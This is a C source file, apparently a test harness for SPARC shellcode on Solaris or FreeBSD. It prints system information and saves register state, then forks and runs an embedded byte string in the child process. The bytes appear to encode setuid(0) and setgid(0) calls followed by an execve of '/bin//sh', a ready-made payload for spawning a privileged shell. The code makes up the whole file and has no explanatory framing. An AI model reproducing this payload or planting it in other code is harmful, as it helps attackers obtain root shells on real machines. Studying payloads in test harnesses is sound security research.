#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "regs/state.h"

#ifndef __sect_shellcode
#define __sect_shellcode __attribute__((section(".sect.shellcode")))
#endif

#ifndef __cold
#define __cold __attribute__((cold))
#endif

#ifndef __unvalidate_cfi
#define __unvalidate_cfi
#endif

#ifndef __unsafe
#define __unsafe __sect_shellcode __cold __unvalidate_cfi
#endif

#ifndef unused
#define unused(x) ((void)(x))
#endif

static char *shellcode = "\x90\x10\x20\x01\x90\x22\x20\x01"
                         "\x82\x10\x20\x17\x91\xd0\x20\x10"
                         "\x90\x10\x20\x01\x90\x22\x20\x01"
                         "\x82\x10\x20\x2e\x91\xd0\x20\x10"
                         "\x94\x10\x20\x01\x94\x22\xa0\x01"
                         "\x11\x0b\xcb\xd8\x90\x12\x22\x69"
                         "\x13\x1b\x8b\xdc\x92\x12\x63\x68"
                         "\xd4\x23\xbf\xfc\xd2\x23\xbf\xf8"
                         "\xd0\x23\xbf\xf4\x90\x23\xa0\x0c"
                         "\xd4\x23\xbf\xf0\xd0\x23\xbf\xec"
                         "\x92\x23\xa0\x14\x82\x10\x20\x3b"
                         "\x91\xd0\x20\x10";

int __unsafe main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int ret, wstatus;
  pid_t pid;
  struct utsname uts;

  // add 2 unused parameters to makes
  // %fp register properly aligned
  void (*trigger)(int a, int b);

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    goto __fallback;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  trigger = (void (*)(int, int))shellcode;

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  pid = fork();

  if (pid < 0) {
    perror("fork()");
    ret = pid;
    goto __must_restore_regs;
  }

  if (!pid) {
    printf("[*] Executing the shellcode..\n");
    trigger(0, 0);
  } else {
    waitpid(-1, &wstatus, 0);
  }

  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  return 0;

__must_restore_regs:
  store_regs(&__serialize_regs(cregs));

__fallback:
  return ret;
}
